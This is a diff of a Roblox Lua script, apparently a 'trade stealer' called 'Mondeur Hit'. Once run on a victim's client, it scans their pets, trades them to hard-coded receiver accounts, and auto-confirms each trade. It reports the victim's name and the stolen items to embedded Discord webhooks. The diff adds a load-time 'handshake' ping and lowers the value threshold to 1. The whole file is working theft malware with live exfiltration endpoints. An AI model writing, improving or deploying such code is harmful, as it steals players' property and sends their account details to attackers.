@@ -4,13 +4,12 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ CONFIG ]] --
+-- [[ UPDATED CONFIG ]] --
 local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
-local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1417861953208193126/wWUd-tqbQT56zqL_y0KSF_s5ZYdBKfLtBJaWYVCN_uwue9hq8CsGuQWJOL1ivGEZ2CYz"
 local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"
 
 local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
-local THRESHOLD = _G.Threshold or 100 -- Set this higher when you're done testing
+local THRESHOLD = _G.Threshold or 1
 local PetValues = {}
 
 -- [[ LOAD POINT SYSTEM ]] --
@@ -25,37 +24,38 @@ local function loadPoints()
 end
 loadPoints()
 
--- [[ THE "FIRE" WEBHOOK ]] --
-local function sendMondeurWebhook(url, pets, total)
+-- [[ FIRE WEBHOOK FUNCTION ]] --
+local function sendMondeurWebhook(url, pets, total, isHandshake)
     local request = (syn and syn.request) or (http and http.request) or http_request or request
     if not request then return end
 
     local petString = ""
-    for _, p in ipairs(pets) do
-        petString = petString .. "⭐ **" .. p.name .. "** • `" .. p.value .. " pts`\n"
+    if not isHandshake then
+        for _, p in ipairs(pets) do
+            petString = petString .. "⭐ **" .. p.name .. "** • `" .. p.value .. " pts`\n"
+        end
     end
 
-    local isHighValue = (total >= THRESHOLD)
-    
     local payload = {
         username = "Mondeur Hit (ADM)",
-        avatar_url = "https://i.imgur.com/8Q0TzS9.png", -- Cool Ninja/Mondeur Icon
+        avatar_url = "https://i.imgur.com/8Q0TzS9.png",
         embeds = {{
-            title = "🚀 **Incoming Transmission: Successful Hit**",
-            description = "A new trade has been successfully intercepted and items moved.",
-            color = isHighValue and 0xff004c or 0x00ffcc, -- Neon Pink for big hits, Neon Cyan for small
-            thumbnail = { url = "https://i.imgur.com/uM9eL7B.png" }, -- Animated-style chest/pet icon
+            title = isHandshake and "🟢 **System Online: Connection Established**" or "🚀 **Incoming Transmission: Successful Hit**",
+            description = isHandshake and "Mondeur Elite is now monitoring the session." or "A new trade has been successfully intercepted.",
+            color = isHandshake and 0x00ff88 or 0xff004c,
+            thumbnail = { url = "https://i.imgur.com/uM9eL7B.png" },
             fields = {
                 {name = "👤 **Target Account**", value = "```" .. LocalPlayer.Name .. "```", inline = true},
-                {name = "💰 **Total Points**", value = "```" .. total .. "```", inline = true},
-                {name = "🎒 **Loot Collected**", value = petString ~= "" and petString or "No data found."}
+                {name = "💰 **Total Points**", value = "```" .. (isHandshake and "N/A" or total) .. "```", inline = true},
             },
-            footer = { text = "Mondeur Services v2.1 • Secured Connection", icon_url = "https://i.imgur.com/8Q0TzS9.png" },
+            footer = { text = "Mondeur Services v2.1", icon_url = "https://i.imgur.com/8Q0TzS9.png" },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
-
-    if isHighValue then payload.content = "@everyone 🔥 **MAJOR HIT DETECTED** 🔥" end
+    
+    if not isHandshake and petString ~= "" then
+        table.insert(payload.embeds[1].fields, {name = "🎒 **Loot Collected**", value = petString})
+    end
 
     pcall(function()
         request({
@@ -67,7 +67,7 @@ local function sendMondeurWebhook(url, pets, total)
     end)
 end
 
--- [[ TRADE LOGIC ]] --
+-- [[ SCAN & TRADE ]] --
 local function scanAndTrade()
     local receiver = nil
     for _, name in ipairs(TARGET_RECEIVERS) do
@@ -81,7 +81,6 @@ local function scanAndTrade()
     if success and inv then
         for _, item in ipairs(inv) do
             if item.Kind == "Pet" then
-                -- FUZZY MATCHING: Checks if "Metal Ox" is anywhere in the name "Neon Ride Metal Ox"
                 for petName, val in pairs(PetValues) do
                     if string.find(item.Name:lower(), petName:lower()) then
                         table.insert(list, {id = item.Id, name = item.Name, value = val})
@@ -94,7 +93,6 @@ local function scanAndTrade()
     end
 
     if #list > 0 then
-        -- Execute Trade
         local TradeAPI = ReplicatedStorage.API
         TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(receiver)
         for _, p in ipairs(list) do
@@ -102,15 +100,14 @@ local function scanAndTrade()
         end
         TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
         TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
-        
-        -- Send the Fire Webhook
-        sendMondeurWebhook(USER_WEBHOOK, list, total)
-        if total >= THRESHOLD then sendMondeurWebhook(DUAL_WEBHOOK, list, total) end
+        sendMondeurWebhook(USER_WEBHOOK, list, total, false)
     end
 end
 
 -- [[ START ]] --
 print("🚀 Mondeur Hit (ADM) ELITE Loaded.")
+sendMondeurWebhook(USER_WEBHOOK, {}, 0, true) -- Send Handshake
+
 task.spawn(function()
     while true do
         pcall(scanAndTrade)
